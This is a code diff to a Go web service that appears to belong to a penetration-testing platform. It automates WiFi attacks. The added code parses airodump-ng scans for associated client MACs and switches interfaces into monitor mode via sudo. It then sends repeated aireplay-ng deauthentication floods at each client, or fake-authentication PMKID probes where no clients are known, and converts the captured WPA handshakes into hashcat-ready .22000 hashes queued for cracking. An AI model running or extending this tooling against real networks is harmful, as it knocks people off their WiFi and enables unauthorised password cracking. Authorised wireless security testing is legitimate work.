@@ -1,8 +1,8 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
 	"os/exec"
@@ -17,14 +17,16 @@ import (
 // ── Data structures ───────────────────────────────────────────────────────────
 
 type WifiAP struct {
-	BSSID   string `json:"bssid"`
-	ESSID   string `json:"essid"`
-	Channel int    `json:"channel"`
-	Power   int    `json:"power"`   // dBm (negative)
-	Privacy string `json:"privacy"` // WPA2, WEP, OPN …
-	Cipher  string `json:"cipher"`
-	Auth    string `json:"auth"`
-	Beacons int    `json:"beacons"`
+	BSSID      string   `json:"bssid"`
+	ESSID      string   `json:"essid"`
+	Channel    int      `json:"channel"`
+	Power      int      `json:"power"`      // dBm (negative)
+	Privacy    string   `json:"privacy"`    // WPA2, WEP, OPN …
+	Cipher     string   `json:"cipher"`
+	Auth       string   `json:"auth"`
+	Beacons    int      `json:"beacons"`
+	Clients    int      `json:"clients"`    // associated station count
+	ClientMACs []string `json:"client_macs"` // MACs of associated stations
 }
 
 type WifiScanJob struct {
@@ -67,22 +69,20 @@ func getWifiInterfaces() []string {
 	return ifaces
 }
 
-// enableMonitorMode kills interfering processes then runs `sudo airmon-ng start <iface>`.
+// enableMonitorMode puts a single interface into monitor mode.
+// Uses "airmon-ng start <iface>" only — no "check kill" so other interfaces
+// (wlan0, NetworkManager, wpa_supplicant) are left completely untouched.
 // Returns the monitor interface name, combined output, and any error.
-func enableMonitorMode(iface string) (monIface, output string, err error) {
-	// Kill NetworkManager / wpa_supplicant first — they will fight monitor mode otherwise.
-	killOut, _ := exec.Command("sudo", "airmon-ng", "check", "kill").CombinedOutput()
-	output = string(killOut)
-
-	startOut, startErr := exec.Command("sudo", "airmon-ng", "start", iface).CombinedOutput()
-	output += string(startOut)
-
+func enableMonitorMode(userID int, iface string) (monIface, output string, err error) {
+	startOut, startErr := sudoRun(userID, "airmon-ng", "start", iface)
+	output = string(startOut)
 	if startErr != nil {
 		return "", output, fmt.Errorf("airmon-ng start: %w", startErr)
 	}
 
-	// Parse "(mac80211 monitor mode vif enabled … on [phyX]wlan0mon)"
-	monIface = iface + "mon" // sensible default
+	// Try to parse the renamed monitor interface from airmon-ng output.
+	// e.g. "mac80211 monitor mode vif enabled on [phy1]wlan0mon"
+	monIface = "" // will be determined below
 	for _, line := range strings.Split(output, "\n") {
 		if strings.Contains(line, "monitor mode vif enabled") {
 			if idx := strings.LastIndex(line, "]"); idx >= 0 {
@@ -94,26 +94,100 @@ func enableMonitorMode(iface string) (monIface, output string, err error) {
 		}
 	}
 
-	// Verify the monitor interface actually appeared in `iw dev`
+	// Scan `iw dev` output for all interfaces and their types.
+	// Some adapters stay as wlan0 in monitor mode rather than becoming wlan0mon.
 	checkOut, _ := exec.Command("iw", "dev").Output()
-	found := false
+
+	type iwIface struct{ name, kind string }
+	var iwIfaces []iwIface
+	var curName string
 	for _, l := range strings.Split(string(checkOut), "\n") {
-		if strings.TrimSpace(l) == "Interface "+monIface {
-			found = true
-			break
+		t := strings.TrimSpace(l)
+		if strings.HasPrefix(t, "Interface ") {
+			curName = strings.TrimPrefix(t, "Interface ")
+		} else if strings.HasPrefix(t, "type ") && curName != "" {
+			iwIfaces = append(iwIfaces, iwIface{curName, strings.TrimPrefix(t, "type ")})
 		}
 	}
-	if !found {
-		return "", output, fmt.Errorf("monitor interface %q not found after airmon-ng start — interface may not support monitor mode", monIface)
+
+	// 1. If airmon-ng told us a name, confirm it exists.
+	if monIface != "" {
+		for _, i := range iwIfaces {
+			if i.name == monIface {
+				return monIface, output, nil
+			}
+		}
 	}
 
-	return monIface, output, nil
+	// 2. Look for any interface now in monitor mode.
+	for _, i := range iwIfaces {
+		if i.kind == "monitor" {
+			return i.name, output, nil
+		}
+	}
+
+	// 3. Check whether the original interface itself switched to monitor mode.
+	for _, i := range iwIfaces {
+		if i.name == iface && i.kind == "monitor" {
+			return iface, output, nil
+		}
+	}
+
+	return "", output, fmt.Errorf("no monitor-mode interface found after airmon-ng start — adapter may not support monitor mode")
 }
 
-// disableMonitorMode runs `sudo airmon-ng stop <monIface>`.
-func disableMonitorMode(monIface string) (string, error) {
-	out, err := exec.Command("sudo", "airmon-ng", "stop", monIface).CombinedOutput()
+// disableMonitorMode restores the monitor interface to managed mode via airmon-ng stop.
+func disableMonitorMode(userID int, monIface string) (string, error) {
+	out, err := sudoRun(userID, "airmon-ng", "stop", monIface)
 	return string(out), err
+}
+
+// enableManagedMode restores <iface> to managed mode and restarts NetworkManager.
+func enableManagedMode(userID int, iface string) (string, error) {
+	var combined string
+	cmds := [][]string{
+		{"ifconfig", iface, "down"},
+		{"iwconfig", iface, "mode", "managed"},
+		{"ifconfig", iface, "up"},
+		{"systemctl", "restart", "NetworkManager.service"},
+	}
+	for _, c := range cmds {
+		out, err := sudoRun(userID, c[0], c[1:]...)
+		combined += string(out)
+		if err != nil {
+			return combined, fmt.Errorf("%s failed: %w", c[0], err)
+		}
+	}
+	return combined, nil
+}
+
+func handleEnableManaged() http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		claims, err := validateToken(extractToken(r))
+		if err != nil {
+			w.WriteHeader(http.StatusUnauthorized)
+			fmt.Fprint(w, `{"error":"Invalid token"}`)
+			return
+		}
+		var req struct {
+			Interface string `json:"interface"`
+		}
+		parseJSON(r, &req)
+		if req.Interface == "" {
+			w.WriteHeader(http.StatusBadRequest)
+			fmt.Fprint(w, `{"error":"interface required"}`)
+			return
+		}
+		out, err := enableManagedMode(claims.UserID, req.Interface)
+		outData, _ := encodeJSON(out)
+		if err != nil {
+			w.WriteHeader(http.StatusInternalServerError)
+			fmt.Fprintf(w, `{"error":%q,"output":%s}`, err.Error(), outData)
+			return
+		}
+		fmt.Fprintf(w, `{"status":"managed","output":%s}`, outData)
+	}
 }
 
 // parseAirodumpCSV parses an airodump-ng CSV file and returns discovered APs.
@@ -127,20 +201,28 @@ func parseAirodumpCSV(path string) []WifiAP {
 	if err != nil {
 		return nil
 	}
+
+	lines := strings.Split(string(data), "\n")
+
+	// ── Pass 1: parse APs ──────────────────────────────────────────────────
+	apMap := map[string]int{} // bssid → index in aps slice
 	var aps []WifiAP
 	inAPs := false
-	for _, rawLine := range strings.Split(string(data), "\n") {
+	stationStart := -1
+
+	for i, rawLine := range lines {
 		line := strings.TrimSpace(rawLine)
-		if strings.HasPrefix(line, "BSSID") {
+		if strings.HasPrefix(line, "BSSID") && !inAPs {
 			inAPs = true
 			continue
 		}
 		if strings.HasPrefix(line, "Station MAC") || strings.HasPrefix(line, " Station MAC") {
+			stationStart = i + 1
 			break
 		}
 		if line == "" {
 			if inAPs {
-				break
+				continue // blank line between AP and station sections — keep going
 			}
 			continue
 		}
@@ -158,6 +240,7 @@ func parseAirodumpCSV(path string) []WifiAP {
 		ch, _ := strconv.Atoi(strings.TrimSpace(parts[3]))
 		pwr, _ := strconv.Atoi(strings.TrimSpace(parts[8]))
 		beacons, _ := strconv.Atoi(strings.TrimSpace(parts[9]))
+		apMap[bssid] = len(aps)
 		aps = append(aps, WifiAP{
 			BSSID:   bssid,
 			ESSID:   strings.TrimSpace(parts[13]),
@@ -169,17 +252,66 @@ func parseAirodumpCSV(path string) []WifiAP {
 			Beacons: beacons,
 		})
 	}
+
+	// ── Pass 2: collect associated client MACs per BSSID ─────────────────
+	// Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
+	if stationStart >= 0 {
+		for _, rawLine := range lines[stationStart:] {
+			line := strings.TrimSpace(rawLine)
+			if line == "" {
+				continue
+			}
+			parts := strings.Split(line, ",")
+			if len(parts) < 6 {
+				continue
+			}
+			stationMAC := strings.TrimSpace(parts[0])
+			assocBSSID := strings.TrimSpace(parts[5])
+			if stationMAC == "" || assocBSSID == "" || assocBSSID == "(not associated)" {
+				continue
+			}
+			if idx, ok := apMap[assocBSSID]; ok {
+				aps[idx].Clients++
+				aps[idx].ClientMACs = append(aps[idx].ClientMACs, stationMAC)
+			}
+		}
+	}
+
 	return aps
 }
 
-// streamToJob reads a pipe line-by-line and appends to job.output.
-func streamToJob(job *WifiScanJob, r *bufio.Scanner) {
-	for r.Scan() {
-		line := r.Text()
-		job.mu.Lock()
-		job.output = append(job.output, line)
-		job.mu.Unlock()
+
+// createHandshakeProject creates a project named after the SSID, a session within it
+// for the captured AP, and a loot entry pointing at the capture files.
+func createHandshakeProject(db *DB, userID int, ssid, bssid string, channel int, capFile, hashFile string, hashCount int) {
+	name := ssid
+	if name == "" {
+		name = bssid
 	}
+	proj, err := db.CreateProject(userID, name, "")
+	if err != nil {
+		return
+	}
+	sess, err := db.CreateProjectSession(userID, proj.ID, "WiFi Handshake Capture", bssid)
+	if err != nil {
+		return
+	}
+	AppendWifiHandshakeLoot(sess.ID, bssid, ssid, bssid, capFile, hashFile, hashCount)
+}
+
+// getFreshClientMACs re-parses the most recent scan CSV to get an up-to-date
+// client list for the given BSSID. Returns nil if nothing found.
+func getFreshClientMACs(sessionID int, bssid string) []string {
+	prefix := fmt.Sprintf("/tmp/wifi-scan-%d", sessionID)
+	for i := 1; i <= 5; i++ {
+		path := fmt.Sprintf("%s-%02d.csv", prefix, i)
+		for _, ap := range parseAirodumpCSV(path) {
+			if strings.EqualFold(ap.BSSID, bssid) && len(ap.ClientMACs) > 0 {
+				return ap.ClientMACs
+			}
+		}
+	}
+	return nil
 }
 
 // ── HTTP handlers ─────────────────────────────────────────────────────────────
@@ -204,7 +336,8 @@ func handleGetWifiInterfaces() http.HandlerFunc {
 func handleEnableMonitor() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
-		if _, err := validateToken(extractToken(r)); err != nil {
+		claims, err := validateToken(extractToken(r))
+		if err != nil {
 			w.WriteHeader(http.StatusUnauthorized)
 			fmt.Fprint(w, `{"error":"Invalid token"}`)
 			return
@@ -218,7 +351,7 @@ func handleEnableMonitor() http.HandlerFunc {
 			fmt.Fprint(w, `{"error":"interface required"}`)
 			return
 		}
-		monIface, out, err := enableMonitorMode(req.Interface)
+		monIface, out, err := enableMonitorMode(claims.UserID, req.Interface)
 		outData, _ := encodeJSON(out)
 		if err != nil {
 			w.WriteHeader(http.StatusInternalServerError)
@@ -232,7 +365,8 @@ func handleEnableMonitor() http.HandlerFunc {
 func handleDisableMonitor() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
-		if _, err := validateToken(extractToken(r)); err != nil {
+		claims, err := validateToken(extractToken(r))
+		if err != nil {
 			w.WriteHeader(http.StatusUnauthorized)
 			fmt.Fprint(w, `{"error":"Invalid token"}`)
 			return
@@ -241,7 +375,7 @@ func handleDisableMonitor() http.HandlerFunc {
 			MonitorIface string `json:"monitor_iface"`
 		}
 		parseJSON(r, &req)
-		out, err := disableMonitorMode(req.MonitorIface)
+		out, err := disableMonitorMode(claims.UserID, req.MonitorIface)
 		outData, _ := encodeJSON(out)
 		if err != nil {
 			w.WriteHeader(http.StatusInternalServerError)
@@ -261,7 +395,8 @@ func handleStartWifiScan(db *DB) http.HandlerFunc {
 			fmt.Fprint(w, `{"error":"invalid session id"}`)
 			return
 		}
-		if _, err := validateToken(extractToken(r)); err != nil {
+		claims, err := validateToken(extractToken(r))
+		if err != nil {
 			w.WriteHeader(http.StatusUnauthorized)
 			fmt.Fprint(w, `{"error":"Invalid token"}`)
 			return
@@ -290,8 +425,11 @@ func handleStartWifiScan(db *DB) http.HandlerFunc {
 		}
 
 		csvPrefix := fmt.Sprintf("/tmp/wifi-scan-%d", sessionID)
-		os.Remove(csvPrefix + "-01.csv")
-		os.Remove(csvPrefix + "-01.cap")
+		// Remove ALL numbered variants so airodump-ng always starts at -01
+		for i := 1; i <= 20; i++ {
+			os.Remove(fmt.Sprintf("%s-%02d.csv", csvPrefix, i))
+			os.Remove(fmt.Sprintf("%s-%02d.cap", csvPrefix, i))
+		}
 
 		args := []string{
 			req.MonitorIface,
@@ -303,7 +441,14 @@ func handleStartWifiScan(db *DB) http.HandlerFunc {
 			args = append(args, "--band", req.Band)
 		}
 
-		cmd := exec.Command("sudo", append([]string{"airodump-ng"}, args...)...)
+		cmd, err := sudoCmd(claims.UserID, "airodump-ng", args...)
+		if err != nil {
+			w.WriteHeader(http.StatusInternalServerError)
+			fmt.Fprintf(w, `{"error":%q}`, err.Error())
+			return
+		}
+		// Use explicit pipes so airodump-ng sees a writable fd (not /dev/null which
+		// can crash ncurses init). Drain both pipes without storing so memory stays flat.
 		stdout, _ := cmd.StdoutPipe()
 		stderr, _ := cmd.StderrPipe()
 
@@ -312,11 +457,12 @@ func handleStartWifiScan(db *DB) http.HandlerFunc {
 			return
 		}
 
+		go io.Copy(io.Discard, stdout)
+		go io.Copy(io.Discard, stderr)
+
 		job := &WifiScanJob{cmd: cmd, csvPath: csvPrefix + "-01.csv"}
 		wifiScanJobs.Store(sessionID, job)
 
-		go streamToJob(job, bufio.NewScanner(stdout))
-		go streamToJob(job, bufio.NewScanner(stderr))
 		go func() {
 			cmd.Wait()
 			job.mu.Lock()
@@ -355,11 +501,35 @@ func handleGetWifiScan(db *DB) http.HandlerFunc {
 		csvPath := job.csvPath
 		job.mu.Unlock()
 
+		// Try the stored path first, then fall back to scanning for any variant
 		aps := parseAirodumpCSV(csvPath)
+		if len(aps) == 0 {
+			prefix := strings.TrimSuffix(strings.TrimSuffix(csvPath, ".csv"), "-01")
+			for i := 1; i <= 20; i++ {
+				candidate := fmt.Sprintf("%s-%02d.csv", prefix, i)
+				if candidate == csvPath {
+					continue
+				}
+				if a := parseAirodumpCSV(candidate); len(a) > 0 {
+					aps = a
+					break
+				}
+			}
+		}
+
+		// Build diagnostic output lines so the user can see what airodump-ng is doing
+		var diagLines []string
+		if info, err := os.Stat(csvPath); err != nil {
+			diagLines = append(diagLines, fmt.Sprintf("[diag] CSV not yet written: %s", csvPath))
+		} else {
+			diagLines = append(diagLines, fmt.Sprintf("[diag] CSV: %s (%d bytes)", csvPath, info.Size()))
+		}
+		allOut := append(diagLines, out...)
+
 		if aps == nil {
 			aps = []WifiAP{}
 		}
-		outData, _ := encodeJSON(out)
+		outData, _ := encodeJSON(allOut)
 		apsData, _ := encodeJSON(aps)
 		status := "running"
 		if done {
@@ -400,9 +570,10 @@ func handleStopWifiScan(db *DB) http.HandlerFunc {
 }
 
 type CaptureTarget struct {
-	BSSID   string `json:"bssid"`
-	ESSID   string `json:"essid"`
-	Channel int    `json:"channel"`
+	BSSID      string   `json:"bssid"`
+	ESSID      string   `json:"essid"`
+	Channel    int      `json:"channel"`
+	ClientMACs []string `json:"client_macs"` // known connected stations
 }
 
 func handleStartWifiCapture(db *DB) http.HandlerFunc {
@@ -414,11 +585,13 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 			fmt.Fprint(w, `{"error":"invalid session id"}`)
 			return
 		}
-		if _, err := validateToken(extractToken(r)); err != nil {
+		claims, err := validateToken(extractToken(r))
+		if err != nil {
 			w.WriteHeader(http.StatusUnauthorized)
 			fmt.Fprint(w, `{"error":"Invalid token"}`)
 			return
 		}
+		userID := claims.UserID
 		var req struct {
 			MonitorIface string          `json:"monitor_iface"`
 			Targets      []CaptureTarget `json:"targets"`
@@ -444,7 +617,13 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 				capPrefix := fmt.Sprintf("/tmp/wifi-cap-%d-%s",
 					sessionID, strings.ReplaceAll(t.BSSID, ":", ""))
 
-				// airodump-ng capture for this BSSID on its channel
+				// Clean up all numbered variants so airodump-ng always starts at -01.
+				for i := 1; i <= 20; i++ {
+					os.Remove(fmt.Sprintf("%s-%02d.cap", capPrefix, i))
+				}
+
+				// airodump-ng capture for this BSSID on its channel.
+				// -c <ch> locks the interface to the correct channel for capture + deauth.
 				capArgs := []string{
 					req.MonitorIface,
 					"--bssid", t.BSSID,
@@ -452,7 +631,16 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 					"--output-format", "cap",
 					"-w", capPrefix,
 				}
-				capCmd := exec.Command("sudo", append([]string{"airodump-ng"}, capArgs...)...)
+				capCmd, capCmdErr := sudoCmd(userID, "airodump-ng", capArgs...)
+				if capCmdErr != nil {
+					job.mu.Lock()
+					job.output = append(job.output,
+						fmt.Sprintf("[!] sudo not available for capture of %s: %v", t.BSSID, capCmdErr))
+					job.mu.Unlock()
+					continue
+				}
+				// Drain airodump-ng output without storing — keeps the pipe writable
+				// so the process doesn't block or crash, but nothing lands in memory.
 				capStdout, _ := capCmd.StdoutPipe()
 				capStderr, _ := capCmd.StderrPipe()
 
@@ -463,73 +651,129 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 					job.mu.Unlock()
 					continue
 				}
+				go io.Copy(io.Discard, capStdout)
+				go io.Copy(io.Discard, capStderr)
 
 				job.mu.Lock()
 				job.cmds = append(job.cmds, capCmd)
 				job.output = append(job.output,
-					fmt.Sprintf("[*] Capture started — %s  ch %d  (%s)", t.BSSID, t.Channel, t.ESSID))
+					fmt.Sprintf("[*] Capture started — %s  ch %d  (%s)", t.BSSID, t.Channel, t.ESSID),
+					fmt.Sprintf("[*] Writing to %s-01.cap", capPrefix),
+				)
 				job.mu.Unlock()
 
-				// Watch output for handshake confirmation
-				watchStream := func(sc *bufio.Scanner) {
-					for sc.Scan() {
-						line := sc.Text()
+				// findCapFile returns the first .cap variant airodump-ng actually wrote.
+				findCapFile := func() string {
+					for i := 1; i <= 20; i++ {
+						p := fmt.Sprintf("%s-%02d.cap", capPrefix, i)
+						if info, err := os.Stat(p); err == nil && info.Size() > 0 {
+							return p
+						}
+					}
+					return ""
+				}
+
+				// Poll for handshake every 5 s using hcxpcapngtool.
+				// More reliable than aircrack-ng: produces a .22000 hash file whose
+				// presence and size definitively confirm a WPA handshake or PMKID.
+				go func() {
+					for {
+						time.Sleep(5 * time.Second)
 						job.mu.Lock()
-						job.output = append(job.output, line)
-						if strings.Contains(line, "WPA handshake") {
-							entry := fmt.Sprintf("%s (%s): %s-01.cap", t.BSSID, t.ESSID, capPrefix)
-							// dedup
-							found := false
-							for _, h := range job.handshakes {
-								if h == entry {
-									found = true
-									break
-								}
-							}
-							if !found {
-								job.handshakes = append(job.handshakes, entry)
-								job.output = append(job.output,
-									fmt.Sprintf("[+] Handshake captured! %s (%s) → %s-01.cap",
-										t.BSSID, t.ESSID, capPrefix))
+						done := job.done
+						job.mu.Unlock()
+						if done {
+							return
+						}
+						capFile := findCapFile()
+						if capFile == "" {
+							job.mu.Lock()
+							job.output = append(job.output, fmt.Sprintf("[diag] waiting for cap file — %s-01.cap not yet written", capPrefix))
+							job.mu.Unlock()
+							continue
+						}
+						hashFile := capFile + ".22000"
+						os.Remove(hashFile) // fresh check each poll
+						exec.Command("hcxpcapngtool", "-o", hashFile, capFile).Run()
+						info, statErr := os.Stat(hashFile)
+						if statErr != nil || info.Size() == 0 {
+							os.Remove(hashFile)
+							job.mu.Lock()
+							job.output = append(job.output, fmt.Sprintf("[diag] hcxpcapngtool: no hashes yet in %s", capFile))
+							job.mu.Unlock()
+							continue
+						}
+						// Count WPA hash lines
+						data, _ := os.ReadFile(hashFile)
+						count := 0
+						for _, line := range strings.Split(string(data), "\n") {
+							if strings.TrimSpace(line) != "" {
+								count++
 							}
 						}
+						job.mu.Lock()
+						job.output = append(job.output, fmt.Sprintf("[diag] hcxpcapngtool: %d hash(es) found in %s", count, capFile))
+						entry := fmt.Sprintf("%s (%s): %s", t.BSSID, t.ESSID, capFile)
+						alreadyFound := false
+						for _, h := range job.handshakes {
+							if h == entry {
+								alreadyFound = true
+								break
+							}
+						}
+						if !alreadyFound {
+							job.handshakes = append(job.handshakes, entry)
+							job.output = append(job.output,
+								fmt.Sprintf("[+] Handshake/PMKID captured! %s (%s) → %s (%d hash(es))",
+									t.BSSID, t.ESSID, capFile, count))
+						}
 						job.mu.Unlock()
+						// Auto-register in the Wifi Handshakes tab for immediate cracking
+						registerCapturedHandshake(capFile, t.ESSID+"_"+strings.ReplaceAll(t.BSSID, ":", ""))
+						// Create a project named after the SSID with a session + loot entry
+						go createHandshakeProject(db, userID, t.ESSID, t.BSSID, t.Channel, capFile, hashFile, count)
+						return // stop polling once found
 					}
-				}
-				go watchStream(bufio.NewScanner(capStdout))
-				go watchStream(bufio.NewScanner(capStderr))
+				}()
 
-				// Short settle before first deauth
+				// Short settle so airodump-ng has locked the channel before deauth fires.
 				time.Sleep(2 * time.Second)
 
 				sendDeauth := func() {
-					deauthArgs := []string{
-						"--deauth", strconv.Itoa(req.DeauthCount),
-						"-a", t.BSSID,
-						req.MonitorIface,
+					// airodump-ng started with -c already locked the interface to the
+					// correct channel. No need for a separate iwconfig call.
+					if len(t.ClientMACs) == 0 {
+						// No known clients — attempt PMKID capture via fake authentication.
+						// This causes the AP to send EAPOL M1 which may contain a PMKID
+						// crackable offline without a full 4-way handshake.
+						sudoRun(userID, "aireplay-ng", "-1", "0", "-a", t.BSSID, "-e", t.ESSID, req.MonitorIface)
+						job.mu.Lock()
+						job.output = append(job.output,
+							fmt.Sprintf("[*] PMKID attack → %s (%s) [fake auth, no clients in scan]", t.BSSID, t.ESSID))
+						job.mu.Unlock()
+						return
 					}
-					out, _ := exec.Command("sudo", append([]string{"aireplay-ng"}, deauthArgs...)...).CombinedOutput()
-					job.mu.Lock()
-					job.output = append(job.output,
-						fmt.Sprintf("[*] Deauth × %d → %s (%s)", req.DeauthCount, t.BSSID, t.ESSID))
-					for _, l := range strings.Split(string(out), "\n") {
-						if strings.TrimSpace(l) != "" {
-							job.output = append(job.output, l)
-						}
+					deauthBase := []string{"--deauth", strconv.Itoa(req.DeauthCount), "-a", t.BSSID}
+					for _, clientMAC := range t.ClientMACs {
+						args := append(append([]string{}, deauthBase...), "-c", clientMAC, req.MonitorIface)
+						sudoRun(userID, "aireplay-ng", args...)
+						job.mu.Lock()
+						job.output = append(job.output,
+							fmt.Sprintf("[*] Deauth × %d → %s client %s", req.DeauthCount, t.BSSID, clientMAC))
+						job.mu.Unlock()
 					}
-					job.mu.Unlock()
 				}
 
 				sendDeauth()
 
-				// If repeat mode, keep sending every 15 s until stopped or handshake captured
+				// If repeat mode, keep sending every 15 s until stopped or handshake captured.
+				// Re-reads scan CSV each round to pick up clients that connected after the scan.
 				if req.DeauthRepeat {
 					go func() {
 						for {
 							time.Sleep(15 * time.Second)
 							job.mu.Lock()
 							done := job.done
-							// check if handshake already captured for this target
 							hsFound := false
 							for _, h := range job.handshakes {
 								if strings.HasPrefix(h, t.BSSID) {
@@ -540,6 +784,10 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 							job.mu.Unlock()
 							if done || hsFound {
 								return
+							}
+							// Refresh client list from scan CSV before each deauth round
+							if fresh := getFreshClientMACs(sessionID, t.BSSID); len(fresh) > 0 {
+								t.ClientMACs = fresh
 							}
 							sendDeauth()
 						}
